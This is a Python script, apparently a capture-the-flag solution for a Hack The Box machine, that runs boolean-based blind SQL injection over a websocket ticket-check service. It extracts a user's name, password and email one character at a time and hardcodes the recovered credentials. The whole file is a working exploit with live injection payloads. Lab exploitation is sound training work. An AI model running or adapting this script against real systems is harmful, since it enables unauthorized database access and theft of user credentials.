import asyncio
import json

import websockets


username = "player"
password = "PlayerOftheMatch2022"
email = "player@player.htb"


def query(data):
    async def _query():
        uri = "ws://soc-player.soccer.htb:9091/"
        async with websockets.connect(uri) as websocket:
            c = json.dumps({"id":data})
            print(data)
            await websocket.send(c)
            res = await websocket.recv()
            return res == "Ticket Exists"

    return asyncio.run(_query())


def blind_injection(sql: str, known=""):
    values = "abcdefghijklmnopqrstuvwxyz"
    values += values.upper()
    values += "1234567890@.:()[]{}"

    search = known
    if not query(sql.format(known)):
        raise Exception("Invalid SQL template, empty request not successful.")

    while True:
        if not query(sql.format(search + "_")):
            print("Success: " + search)
            return search  # No character is missing, return search

        found = False
        for v in values:
            if query(sql.format(search+v)):
                search += v
                found = True
                break

        if not found:
            raise Exception(f"{search} is not complete but no value was successful. "
                            f"Missing character in values?")


# brute-force username, password and email (case sensitive!)
blind_injection("1 or 1=1 and username LIKE BINARY '{}%'", known="player")
blind_injection("1 or 1=1 and username = 'player' and password LIKE BINARY '{}%'", known="PlayerOftheMatch2022")
blind_injection("1 or 1=1 and username = 'player' and email LIKE BINARY '{}%'", known="player@player.htb")

